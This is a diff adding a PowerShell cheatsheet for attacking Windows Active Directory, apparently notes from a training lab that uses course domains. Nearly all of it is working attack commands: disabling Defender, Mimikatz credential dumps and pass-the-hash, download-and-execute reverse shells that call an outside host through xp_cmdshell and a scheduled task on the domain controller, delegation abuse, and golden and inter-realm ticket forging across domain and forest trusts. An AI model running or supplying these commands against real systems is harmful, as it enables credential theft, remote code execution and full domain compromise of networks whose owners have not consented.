@@ -1,0 +1,136 @@
+
+# Cheatsheet
+
+## Bypasses
+
+```powershell
+# AMSI bypass text file before local admin
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Check applocker policy
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+## Initial Domain Enum
+
+```powershell
+Get-NetDomain
+Get-DomainSID
+Get-NetDomainController
+Get-NetComputer | select samaccountname
+
+Get-NetUser | select SamAccountName
+Get-NetUser -Username name1
+
+Get-NetGroup
+Get-NetGroupMember "Domain Admins"
+Get-NetGroupMember "Enterprise Admins"
+
+Invoke-ShareFinder -CheckShareAccess # Also specify domains
+
+Get-NetDomainTrust
+
+# Target these to get DA creds
+Get-NetComputer -UnConstrained
+Invoke-UserHunter
+```
+
+## Local PrivEsc
+
+```powershell
+# Local privesc
+Invoke-AllChecks
+# Add current user to admins group
+# Unquoted service path example:
+Invoke-ServiceAbuse -Name '<service name>' -User dcorp\student141
+```
+
+## Lateral Movement
+
+```powershell
+# Find local admin access
+Find-LocalAdminAccess -Verbose
+
+# Stateful sessions/commands
+$sess = New-PSSession -ComputerName Server1
+Invoke-Command -Session $sess -FilePath .\PowerUp.ps1
+Invoke-Command -Session $sess -ScriptBlock {whoami}
+Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName domain.local
+
+# Mimikatz dump creds
+. .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz -DumpCreds
+Invoke-Mimikatz -DumpCreds -ComputerName <computer name>
+
+# Mimikatz new shell with user creds
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlmhash> /run:powershell.exe"'
+
+# Web Reverse shell
+powershell.exe -c "iex (iwr http://172.16.100.137/Invoke-PowershellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTCP -Reverse -IPAddress 172.16.100.137 -Port 443"
+# SQL reverse shell
+'exec master..xp_cmdshell "powershell iex (New-Object Net-WebClient).DownloadString(''http://172.16.100.137/Invoke-PowershellTcp.ps1'')"'
+powershell.exe iex (iwr http://172.16.100.137/Invoke-PowershellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.137 -Port 443
+# Scheduled task reverse shell
+# Make sure powershell script has added call at the end of the file
+# Host powershell script in the web server
+# Start a listener with powercat
+# Ensure firewalls are turned off
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User141" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://<host-ip>/Invoke-PowerShellTcp.ps1''')'"
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User141"
+# Check listener
+```
+
+## Domain Privesc
+
+```powershell
+### Unconstrained Delegation
+# With higher privs, or a shell running as system
+Get-NetComputer -UnConstrained
+# Compromise where unconstrained delegation is enabled
+Invoke-Mimikatz -Command '"sekurlsa::tickets"'
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+# The DA token could be reused
+Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+
+### Constrained Delegation
+# powerview dev
+Get-DomainUser -TrustedToAuth
+# With AD Module
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+# Using asktgt from kekeo we request a TGT
+kekeo> tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:<ntlm hash>
+# using s4u from kekeo, we request a TGS - Service from <Allowed to delegate to>
+kekeo> tgs::s4u /tgt:<returns from above> /user:Administrator@DOLLARCORP.MONEYCORP.LOCAL /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
+# Inject a saved tgs into current session
+Invoke-Mimikatz -Command '"kerberos:ptt <.kirbi file>"'
+```
+
+## Child to Parent Domain
+
+```powershell
+# Trust tickets
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
+# Forge inter-realm TGT - <sid> is the SID of the current domain <sids> is the SID of the enterprise admins group of the parent domain
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<sid string> /sids:<sids string> /rc4:<rc4 ntlm> /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
+# Present forged ticket and request a new ticket for the new filesystem
+.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi HOST/mcorp-dc.moneycorp.local
+.\kirbikator.exe lsa .\HOST.mcorp-dc.moneycorp.local.kirbi
+# Scheduled task reverse shell
+
+# With krbtgt hash
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc    # to get krbtgt hash
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<sid string> /sids:<sids string> /krbtgt:<krbtgt ntlm> /ptt"'
+# Scheduled task reverse shell
+```
+
+## Cross Forest
+
+```powershell
+# Get machine hash for target forest
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc
+# Forge inter-forest TGT
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<sid string> /rc4:<rc4 hash from above command> /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"'
+.\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local # Also try HOST to schedule tasks
+.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
+# If CIFS, use Invoke-ShareFinder -CheckShareAccess -Domain <target-domain> to find where you can read
+```
